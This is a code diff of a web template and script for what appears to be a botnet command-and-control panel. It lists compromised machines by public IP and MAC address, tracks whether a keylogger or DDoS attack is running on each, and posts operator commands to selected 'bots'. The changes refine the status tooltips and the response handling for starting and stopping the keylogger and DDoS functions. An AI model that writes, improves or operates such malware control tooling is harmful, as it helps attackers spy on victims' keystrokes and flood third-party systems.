@@ -85,7 +85,15 @@
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.public_ip }}</td>
                                 <td class="tw-text-background tw-text-center tw-pt-2">{{ session.mac_address }}</td>
                                 {% if session.online %}
-                                    <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger not running&#10;DDoS attack not running">
+                                    {% if session.running == 0 %}
+                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger not running&#10;DDoS attack not running">
+                                    {% elif session.running == 1 %}
+                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger running&#10;DDoS attack not running">
+                                    {% elif session.running == 2 %}
+                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger not running&#10;DDoS attack running">
+                                    {% elif session.running == 3 %}
+                                        <td class="tw-text-background tw-text-center tw-pt-2" id="status-{{ session.uid }}" title="Online&#10;Keylogger running&#10;DDoS attack running">
+                                    {% endif %}
                                         <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6">
                                             <path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z" />
                                         </svg>
@@ -149,41 +157,47 @@
 			// iterate through selected sessions
 			for (var i = 0; i < sessions.length; i++) {
 				var session = sessions[i];
-					var uid = session.getAttribute('id').split('-')[1];
+                var uid = session.getAttribute('id').split('-')[1];
+                console.log("Sending command: '" + command + "' to session '" + uid + "'");
 
-					console.log("Sending command: '" + command + "' to session '" + uid + "'");
-
-					$.ajax({
-						url: "{{ url_for('session.session_cmd') }}", 
-						type: "POST",
-						data: {session_uid: uid, cmd: command}, 
-						ajaxI: i,
-						success: function(response) {
-                			i = this.ajaxI;
-							toastr.success("Bot " + i + ": " + response);
-                            $('#status-' + uid).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
-                            var currentTitle = $('#status-' + uid).prop("title");
-                            var newTitle = "Online&#10;Keylogger not running&#10;DDoS attack not running";
-                            currentTitle = currentTitle.replace("Offline", newTitle);
-                            if (response == "offline") {
-                                newTitle = "Offline";
-                                $('#status-' + uid).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
+                $.ajax({
+                    url: "{{ url_for('session.session_cmd') }}", 
+                    type: "POST",
+                    data: {session_uid: uid, cmd: command}, 
+                    ajaxI: i,
+                    success: function(response) {
+                        i = this.ajaxI;
+                        toastr.success("Bot " + i + ": " + response);
+                        $('#status-' + uid).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
+                        $(document).ready(function() {
+                            var currentTitle = $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).prop("title");
+                            var newTitle;
+                            if (currentTitle === "Offline") {
+                                newTitle = "Online\nKeylogger not running\nDDoS attack not running";
+                                $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="green" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
                             }
-                            if (response in ["Keylogger started", "Keylogger is still running, please end it first"]) {
+                            if (response === "offline") {
+                                newTitle = "Offline";
+                                $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).html('<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="red" class="tw-w-6 tw-h-6"><path stroke-linecap="round" stroke-linejoin="round" d="M8.288 15.038a5.25 5.25 0 017.424 0M5.106 11.856c3.807-3.808 9.98-3.808 13.788 0M1.924 8.674c5.565-5.565 14.587-5.565 20.152 0M12.53 18.22l-.53.53-.53-.53a.75.75 0 011.06 0z"/></svg>');
+                            }
+                            if (response === "Keylogger started") {
                                 newTitle = currentTitle.replace("Keylogger not running", "Keylogger running");
                             }
-                            if (response == "Keylogger stopped") {
+                            if (response === "Keylogger stopped" || response === "Keylogger not running") {
                                 newTitle = currentTitle.replace("Keylogger running", "Keylogger not running");
                             }
-                            if (response in ["DDoS attack started", "DDoS attack already running"]) {
+                            if (response === "DDoS attack started") {
                                 newTitle = currentTitle.replace("DDoS attack not running", "DDoS attack running");
                             }
-                            if (response == "DDoS attack stopped") {
+                            if (response === "DDoS attack stopped" || response === "DDoS attack not running") {
                                 newTitle = currentTitle.replace("DDoS attack running", "DDoS attack not running");
                             }
-                            $('#status-' + uid).prop("title", newTitle);
-			            }
-			        });
+                            if (newTitle !== undefined) {
+                                $('#status-' + uid.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")).prop("title", newTitle);
+                            }
+                        });
+                    }
+                });
 			}
 		}
 	</script>
